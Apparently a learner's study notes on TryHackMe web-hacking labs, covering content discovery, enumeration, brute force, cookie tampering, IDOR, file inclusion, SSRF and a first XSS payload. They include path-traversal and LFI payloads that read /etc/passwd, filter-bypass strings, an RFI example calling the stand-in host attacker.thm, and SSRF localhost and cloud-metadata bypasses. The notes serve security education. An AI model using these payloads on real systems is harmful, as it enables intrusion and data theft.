# Web Hacking

Browser Tools 

- **View Source** - Use your browser to view the human-readable source code of a website.
- **Inspector** - Learn how to inspect page elements and make changes to view usually blocked content 
- **Debugger** - Inspect and control the flow of a page's JavaScript 
- **Network** - See all the network requests a page makes 

## Developer Tools (Insepctor)

![image](https://user-images.githubusercontent.com/79100627/165856751-68abf0ed-54ad-4a56-8680-e1c3a3fc73e1.png)

DIV element with the class premium-customer-blocker - you can see the display as **block** </br>
However, you can write the the value of your own choice. Try type **none** </br> 
It will show the original text 

![image](https://user-images.githubusercontent.com/79100627/165856908-68c60f78-6c13-4fa3-9c55-375ee2179e29.png)

## Developer Tools (Debugger) 

Debugger is intended to debugging javascript </br>
As a penetration testers, it gives us the option of digging deep into the JavaScript code 

JavaScript files formats are removed due to the file utilization 

![image](https://user-images.githubusercontent.com/79100627/165858912-87721477-9bc8-4f32-86ea-65f1640c5604.png)

By clicking this, it will format the JS file

![image](https://user-images.githubusercontent.com/79100627/165858974-b94c978b-b0fd-4951-8846-eadf0b75092a.png)

Set the pointer and refresh for the debugging

## Developer Tools (Network)

The network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you will see all the files the page is requesting 

![image](https://user-images.githubusercontent.com/79100627/165859452-04062387-a6f8-4c7d-a7b6-f556bbf507e3.png)

There is a event happening for contact-msg which is the form being submitted in the background using a method called AJAX. AJAX is a method of sending and receiving network data in a web application background without interfering by changing the current web page. 


## What is Content Discovery 

Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we're not talking about the obvious things we can see on a website; it's the thing that aren't immeidately presented to us and that weren't always intended for public access. 

There are three ways of discovering content on a website called **Manually, Automated and OSINT (Open Source Intelligence)**

![image](https://user-images.githubusercontent.com/79100627/165861123-6eb3c5ce-21e3-4132-b1cc-86edf1c9db13.png)

The file contains search engines which pages they are and aren't allowed to show their search engine result or ban specific search engines from crawling the website. 

## Manual Discovery (Favicon)

The favicon is a small icon displayed in the browswer's address bar or tab used for branding a website 

![image](https://user-images.githubusercontent.com/79100627/165861294-fe7a77e9-e0e3-45ff-8316-59f205cbded0.png)

Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer does not replace with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons 

To find the vulnerability of a website 

![image](https://user-images.githubusercontent.com/79100627/165861574-91734266-1b65-4fe1-960a-969e34afb3b4.png)

Here is the icon and if you download favicon and get md5 hash by using curl command and compare with the https://wiki.owasp.org/index.php/OWASP_favicon_database

![image](https://user-images.githubusercontent.com/79100627/165861793-c9fb8b96-1508-4589-9bcd-3ab64f059967.png)


## Maunal Discovery (Sitemap.xml) 

unlike the txt file above, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can contain areas of the website that are bit mroe difficult to navigate to or even list some old webpages that the current site no loger uses but are still working behind the scenes. 

## Manual Discovery (Headers) 

When we make a requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. 

By using the curl command we can see the version of the website and using this information, we could find vulnerable versions of software being used. Try running the below crul command (-v)

![image](https://user-images.githubusercontent.com/79100627/165862848-f8775fb8-19ec-4813-a3f6-65bc2a7e8b82.png)

## Manual Discovery (Framework Stack) 

Once you've established the framework of website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework website. 

## OSINT (Google Hacking / Dorking)

Google Hacking / Dorking utilizeis Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out the results from a certain domain name using the site: filter, for example (site:tryhackme.com) you can then match this up with certain search terms, say, for example, the word admin (stie: tryhackme.com admin) this then would only return results from the tryhackme.com 

![image](https://user-images.githubusercontent.com/79100627/165864053-5b42470f-b307-4a56-995b-c2566c7ddc8f.png)

## Wappalyzer 

Wappalyzer is an online tool and browser extension that helps identify what technologies a website uses, such as framworks, Content Management System(CMS), payment processors and much more, and it can even find version number as well. 

## Automated Discovery

Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists. 

### What are wordlists?

Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the m0st frequenlty used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on THM AttackBox is https://github.com/danielmiessler/SecLists

### Automation Tools

Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster 

## Subdomain Enumeration 

Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potnetial points of vulnerability. 

Different Subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host. 

## What is Subdomain

Subdomains are a prefix added to your domain name in order to help navigate and organize sections of your website. They are primarily used to manage site areas that are extensive enough to require their own hierarchy, such as online stores, blogs, or support platforms 

## OSINT - SSL/TLS Certification

When an SSL/TLS (Secure Socket Layer/ Transport Layer Security) certificate is created for a domain by a CA(Certificate Authroity), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain. sites like https://crt.sh and https://transparencyreport.google.com/https/certificates offer a searchable database of certificates that shows current and historical results. 

## OSINT - Search Engines 

Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narriow the search results. For example, "-site:www.domain.com site:*.domain.com" would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com. 

## DNS BruteForce

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform


## OSINT - Sublist3r 

Automation Using Sublist3r 

To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r
![image](https://user-images.githubusercontent.com/79100627/166008826-ed905c3a-b19f-47ee-b2ab-884fdf878483.png)

## Virtual Hosts 

Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or adminstration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or C:\windows\system32\drivers\etc\hosts file for Window users) which maps domain names to IP address 

Because Web servers can host multiple websites from one server when a website is requrested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we've disovered a new website.

Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains. 

![image](https://user-images.githubusercontent.com/79100627/166010067-cb668c3f-a9e9-435f-b2a4-0ff6d1da79d3.png)

The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host Header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist. 

Because the above command will always produce valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. 

![image](https://user-images.githubusercontent.com/79100627/166054378-bb4b2ebd-42cd-4e7a-af65-c86f01867877.png)

This command has a similar syntax to the first aprt from the -fs swtich, which tells ffuf to ignore any results that are of the specified size. 

## Username Enumeration 

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames

Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT support website (http://10.10.239.104/customers/signup) signup page. 

If you try enterint the username **admin** and fill in the other form fields with fake information, you will see we get the error **An account with this username already exists.** We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches 

![image](https://user-images.githubusercontent.com/79100627/166064008-562edc9c-55bc-4ca9-b85f-f23854d95246.png)

In the above example, the ```-w``` argument selects the file's location on the computer that contains the list of usernames that we're going to check exist. The ```-X``` argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The ```-d``` argument specifies the data that we are going to send. In our example, we have the fields username,email,password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The ```-H``` argument is used for adding additional headers to the request. In this instance, we're setting ``` Content-Type``` to the Webserver knows we are sending form data. The ```-u``` argument specifies the URL we are making the request to, and finally, the ```-mr``` argument is the text on the page we are looking for to validate we've found a valid username. 

## Brute Force 

Using the valid_usernames.txt file, we can now use this to attempt a brute force attack on the login page (http://10.10.239.104/customers/login) 

A brute force attack is an automated process that tries a list of commonly used passwords against either a signle username, or like in our case, a list of usernames.

![image](https://user-images.githubusercontent.com/79100627/166067252-d4959466-c5ec-4f2b-a4c1-6ad9ed969b49.png)

This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen ```W1``` for our list of valid usernames and ```W2``` for the list of passwords we will try. The multiple wordlists are again specified with the ```-w``` argument but separated with a comma. For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.

## Logic Flaw 

Sometimes authentication process contains logical flaws. A logic flaw is when the typical logical path of an application is either by passed, circumvented or manipulated by a hacker. Logical flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![image](https://user-images.githubusercontent.com/79100627/166252576-39420cba-e952-4fb9-a754-68c5ff3c371b.png)

### Logical Flaw Example 

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with/admin, the page is shown to the client. 

```
if(url.substr(0,6) === '/admin') {
  # Code to check user is an admin
}else 
{
  # View Page 
}
```
Because the above PHP code example uses three equals sign(===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting **/adMin** will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks 

### Logical Flaw Example 

![image](https://user-images.githubusercontent.com/79100627/166256463-9449a42f-5720-4914-9938-d2074beae36d.png)

We use the ```-H``` flag to add an additional header to the request. In this instance, we are setting the ```Content-Type``` to ```application/x-www-form-urlencoded```, which lets the web server know we are sending form data so it properly understands our request. In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable ```$_REQUEST```. 

The PHP ```$_REQUEST``` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delievered.

![image](https://user-images.githubusercontent.com/79100627/166258961-db044a96-aa8b-48e1-bc3b-fa2f5d444eca.png)

For next step, you will need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The emailaddress is in the format of ```{username}```@customer.acmeitsupport.thm now rerunning Crul Request 2 but with your @acmeitsupport.thm in the email field you will have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag. 

![image](https://user-images.githubusercontent.com/79100627/166259610-a4244587-2819-4514-8c76-4e56b0e02c50.png)

## Cookie Tampering 

### Plain Text 

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login: 
```
Set-Cookie: logged_in=true; Max-Age=3600;Path=/ 
Set-Cookie: admin=false; Max-Age:3600; Path=/
```

We see one cookie (logged_in) which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin previleges. Using this logic, if we were change the contents of the cookies and make request we will be able to change our privilleges.

![image](https://user-images.githubusercontent.com/79100627/166260958-c82c1a80-c164-4509-9ff2-86a06c3e22af.png)

Now we will send another request with the logged_in cookie set to true and the admin cookie set to false 

![image](https://user-images.githubusercontent.com/79100627/166261213-f034bc0c-332b-46a9-af71-45e6aa9c52d2.png)

We will send one last request setting both the logged_in and admin cookie to true: 

![image](https://user-images.githubusercontent.com/79100627/166261474-a4b369d2-29f9-457b-a9d8-1a18ed16da09.png)

### Hashing 

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. 

### Encoding

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point of encoding?

Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base 32 which converts binary data to the character A-Z and 2-7 and base 64 which converts using the characters a-z, A-Z, 0-9, +, / and the qeuals sign for padding.

Take the below data as an example which is set by the web server upon logging in: 

``` 
Set-Cookie: eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```
This String base 64 decoded has the value of {"id":1,"admin":false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access. 

## IDOR 

IDOR stands for Insecure Direct Object Reference and is type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it. 

## IDOR Example 

Imagine you just signed up for an oline service, and you want to change your profile information. The link you click on goes to http://website/profile?user_id=1305 and you can see your information.

Curiosity gets better of you, and you try changing the user_id value 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can see now see another user's information. You have now discovered an IDOR vulnerability! ideally, there should be a check on the website to confrim that the user information belongs to the user logged requesting it.

## Encoded IDs 

When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into ASCII string commonly using the ```a-z, A-Z, 0-9 and =``` character for padding. The most common encoding technique on the web is base64 encoding and can ususally be pretty easy to spot. You can use website like https://www.base64decode.org/ to decode the string, then edit the data and re-encoding it again using https://www.base64encode.org/ and then resubmit web request to see if there is a change in the response. 

![image](https://user-images.githubusercontent.com/79100627/166289120-63a6f78a-f2c6-4fc6-a9f6-efa5381e086b.png)

## Hashed IDs

Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern such as being the hashed version of the integer value. For example, the ID number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.

It is worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches 

## Finding IDORs in Unpredictable IDs 

Unpredictable IDs 

If the id can not be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the ID numbers between them. If you can view the other user's content using their ID number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability 

## Where are IDORs located

The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details/ details displaying your user information (authenticated through your session). But through attack known as parameter mining, you discover a parameter called user_id that you can use to display other user's information, for exmaple, /user/details?user_id=123

## IDOR Example 

![image](https://user-images.githubusercontent.com/79100627/166291320-69aaf4cc-ce3a-497b-982c-708b5d2b6fe3.png)

![image](https://user-images.githubusercontent.com/79100627/166291398-42c135ca-0bf6-470e-9ef3-9e8c429b607a.png)

Found the vulnerability for Customer ID 

![image](https://user-images.githubusercontent.com/79100627/166291514-bd3a1963-cbf1-4ff2-a6cb-512745ea27ff.png)


## File Inclusion

### What is File Inclusion

Essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. </br>
In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data perform actions based on user input. 

![image](https://user-images.githubusercontent.com/79100627/166558240-a858129a-9734-48fc-b5a3-6340ce5e0ad1.png)

For example, parameters are used with Google Searching, where ```GET``` requests pass user input into the search engine. ```https://www.google.com/search?q=TryHackMe```. Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the web server that includes a file to display. For example, if a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, ```http://webapp.thm/get.php?file=userCV.pdf``` where the ```file``` is the parameter and the ```userCV.pdf```, is the required file to access. 

![image](https://user-images.githubusercontent.com/79100627/166558805-95931b86-d205-4ac2-9b9e-08b4cbb3c83a.png)


## Why do File inclusion vulnerabilities happen? 

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability 

## What is the risk of File Inclusion?

It depends! if the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as ```/tmp``` directory, then it is possible to gain remote command execution RCE. However, it won't be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server. 

## Path Traversal 

Also known as ```Directory Traversal```, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory. 

Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It is most important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. 

The following graph shows how a web application stores files in ```/var/www/app```. The happy path would be the user requesting the contents of userCV.pdf from a defined path ```var/www/app/CVs```. 

![image](https://user-images.githubusercontent.com/79100627/166559999-9500e453-bc2d-4166-8cdf-fbd3cd63535c.png)

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the ```dot-dot-slash``` attack, take advantage of moving the directory one step up using the double dots ```../```. If the attacker finds the entry point, which in this case ```get.php?file=```, then the attacker may send something as follows, ```http://webapp.thm/get.php?file=../../../../etc/passwd``` </br>
Suppose there isn't input validation, and instead of accessing the PDF files at ```/var/www/app/CVs``` location, the web application retrieves files from other directories, which in this case ```/etc/passwd```. Each ```..``` entry moves one directory until it reaches the root directory ```/```. Then it changes the directory to ```/etc```, and from there, it read the ```passwd``` file. 

![image](https://user-images.githubusercontent.com/79100627/166560670-0ac4b86f-9842-4594-98c6-965d03bff22f.png)


As the result, the web application sends back the file's content to the user

![image](https://user-images.githubusercontent.com/79100627/166563572-d0c5b0b5-98d3-4542-b2f5-5aada71ea5a2.png)

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in ```c:\boot.ini``` then the attacker can try the following depending on the target OS version: 
```http://webapp.thm/get.php?file=../../../../boot.ini``` or ```http://webapp.thm/get.php?file=../../../../windows/win.ini```
The same concept applies here as with Linux operating system, where we climb up directories until it reaches the root directory, which is usually ```c:\```.
Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.

![image](https://user-images.githubusercontent.com/79100627/166564002-b3c5fe5b-9983-47ab-bb04-a74240f0f0ae.png)

## Local File Inclusion (LFI)

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as ```include```,```require```,```include_once```, and ```require_once``` often contribute to vulnerable web applications.

1. Suppose the web application provides two languages, and the user can select between the ```EN``` and ```AR```

```
<?PHP
      include($_GET["lang"])
?>
```
The PHP code above uses a ```GET``` request via the URL parameter ```lang``` to include the file of the page. The call can be done by sending the following HTTP request as follows: ```http://webapp.thm/index.php?lang=EN,php``` to load the English page or ```http://webapp.thm/index.php?lang=AR.php``` to load the Arabic page, where EN.php and AR.php files exist in the same directory. 
Theoraetically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the ```/etc/passwd``` file, which contains sensitive information about the users of the Linux operating system, we can try the following: ```http://webapp.thm/get.php?file=/etc/passwd```, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd```

In this case, it works because there isn't a directory specified in the include function and no input validation. 

2. Next, In the following code, the developer decided to specify the directory inside the function.

```
<?PHP
      include("languages/". $_GET['lang']);
 ?>
```

In the above code, the developer decided to use the ```include``` function to call ```PHP``` pages in the languages directory only via ```lang``` parameters. If there is no input validation, the attacker can manipulate the URL by replacing the ```lang``` input with other OS-senstivie files such as ```/etc/passwd```. Again the payload looks similar to the ```path traversal```, but the include function allows us to include any called files into the current page. The following will be the exploit: ```http://webapp.thm/index.php?lang=../../../../etc/passwd```
 
 ## Local File Inclusion #2 
 
 1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing blackbox testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app. 

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input such as THM, we get the following error 

```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like ```include(languages.THM.php);```. If you look at the directory closely, we can tell the function includes files in the language directory adding ```.php``` at the end of the entry. Thus the valid input will be something as follows: ```index.php?lang=EN```, where the file ```EN``` is located inside the given ```languages``` directory and named ```EN.php```

Also, the error message disclosed another important piece of information about the full web application directory path which is ```/var/www/html/THM-4/```

To exploit this, we need to use the ```../```trick, as described in the directory traversal section, to get out the current folder. 

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

Note that we used 4 ```../``` because we know the path has four levels ```/var/www/html/THM-4```. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
It seems we could move out the PHP directory but still, the ```include``` function reads the input with ```.php``` at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BTYE, which is ```%00```.

Using null bytes is an injection technique where URL-encoded representation such as ```%00``` or ```0x00``` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the NULL bytes. 

by adding the Null Byte at the end of the payload, we tell the ```include``` function to ignore anything after the null byte which may look like 

``` include("languages/../../../../../etc/passwd%00").".php"); ``` 
which equivalent to ```include("languages/../../../../etc/passwd");```

NOTE: the ```%00``` trick is fixed and not working with PHP 5.3.4 above. 

2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The ```/etc/passwd``` file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte ```%00``` or the current directory trick at the end of the filtered keyword ```/.```. The exploit will be similar to ```http://webapp.thm/index.php?lang=/etc/passwd/.``` We could also use ```http://webapp.thm/index.php?lang=/etc/passwd%00```. 

To make it clearer, if we try this concept in the file system using ``cd ..``, it will get you back one step; however, if you do ```cd .```, it stays in the current directory. Similarly, if we try ```/etc/passwd/..```, it results to be ```/etc/``` and that's because we moved one to the root. Now if we try ```/etc/passwd/.```, the result will be ```/etc/passwd``` since dot refers to the current directory. 

3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message! 

``` http://webapp.thm/index.php?lang=../../../../etc/passwd```

We got the following error!

``` Warning include(languages/etc/passwd/): falied to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15. ```

If we check the warning message in the ``` include(languages/etc/passwd) ``` section, we know that the web application replaces the ```../``` with the empty string. There are a couple of techniques we can use to bypass this. 

First, we can send the following payload to bypass it: ``` ....//....//....//....//....//etc/passwd ``` 

Why did this work?

This work because the PHP filter matches and replaces the first subset string ``` ../ ``` it finds and does not do another pass

![image](https://user-images.githubusercontent.com/79100627/166819691-82031b30-b8aa-41bb-a244-4758ff7c0920.png)

## Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into ```include``` function. One requirement for RFI is that ```allow_url_fopen``` option needs to be ```on```. 

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include: 

- Sensitive Information Disclosure 
- Cross Scripting (XSS) 
- Denial of Service (DoS) 

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is inejcted into the include function via HTTP requests, and the content of malicious file executes on the vulnerable application server. 

![image](https://user-images.githubusercontent.com/79100627/166822359-57abe026-c07d-4e80-9665-704ae7213610.png)

## RFI steps 

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server ```http://attacker.thm/cmd.txt``` where ```cmd.txt``` contains a printing message ```Hello THM```. 

```
<?PHP echp "Hello THM";?>
```

First attacker injects malicious URL, which points to the attacker's server, such as ```http://webapp.thm.index.php?lang=http://attacker.thm/cmd.txt```. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the ```Hello THM``` message. 

## FI Inclusion Challenges 

### Change the GET to POST 

Open the inspector and change the form < form action="#" method="GET" > to < form action"#" method="POST" >
  
  ![image](https://user-images.githubusercontent.com/79100627/167317338-d3c6137b-c902-429c-8069-065e64f5b71e.png)
  ![image](https://user-images.githubusercontent.com/79100627/167317358-ee8b880e-c58c-44ce-9e56-624d5121d786.png)

### Change the Cookie 

Open the inspector and you can change the cookie value in the **Storage**

![image](https://user-images.githubusercontent.com/79100627/167317615-316119d6-5ba3-4079-97cd-6a9c9c58b1a9.png)


## SSRF

### What is an SSRF?

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing 

## Type of SSRF 

There are two types of SSRF vulnerability; the first is regular SSRF where data is retunred to the attacker's screen.</br>
The second is Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen. </br>

## What is the impact?

A successful SSRF attack can result in any of the following:
- Access to unauthroized areas. 
- Access to customer/organizational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials. 

## SSR Examples 

How attacker can have complete control over the page requested by the webserver. The Expected Request is what the website.thm server is expecting to receive with the section in red being the URL that the website will fetch for the information. The attacker can modify the area in red to an URL of their choice 

![image](https://user-images.githubusercontent.com/79100627/167318372-407038d2-0ce0-4680-a4cf-b76e0a3c4147.png)

This one shows how attacker can still reach the /api/user page with only having control over the patch by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user

![image](https://user-images.githubusercontent.com/79100627/167318453-2df5b5ad-76b9-45ef-9b36-e5a9c9c01c2e.png)

In this example, the attacker can control the server's subdomain to which the request is made. Take note of payload ending in ```&x=``` being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. 

![image](https://user-images.githubusercontent.com/79100627/167318503-da09f98b-8f35-4a0a-ae42-5a2e71d21177.png)

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specific domain. These headers could contain authentication credentials or API keys sent by the website.thm (that would normally authenticate to api.website.thm). 

![image](https://user-images.githubusercontent.com/79100627/167318571-2e1c4773-0562-4428-8932-26395dd81048.png)

## Finding an SSRF 

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an exaple of four common places to look: 

- When a full URL is used in parameter in the address bar
![image](https://user-images.githubusercontent.com/79100627/167319310-c33b1337-3847-4358-b1f7-6acd3405d80a.png)

Some of these examples are easier to exploit than others, and this is where a lot of trials and error will be required to find a working payload. If working with a blind SSRF where no output is reflected back to you, you will need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

## Defeating Common SSRF Defenses 

More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requests resources meets specific rules. There are usually two approaches to this, either a deny list or an allow list 

### Deny List 

A Deny List is where all requests are accpeted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrct access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves tot he IP address 127.0.0.1 such as 127.0.0.1.nip.io.

Also in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS records that points to the IP address 169.254.169.254

### Allow List 

An Allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.htm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request. 

### Open Redirect 

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the umber of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice. 

## Cross-Site Scripting 

In XSS, the payload is the Java Script code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification. 

The intention is what you wish the JavaScript to actually do (which we will cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task). 

Here are some examples of XSS intentions. 

### Proof Of Concept: 

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example: 

```<script>alert('XSS');</script>```

### Session Stealing 

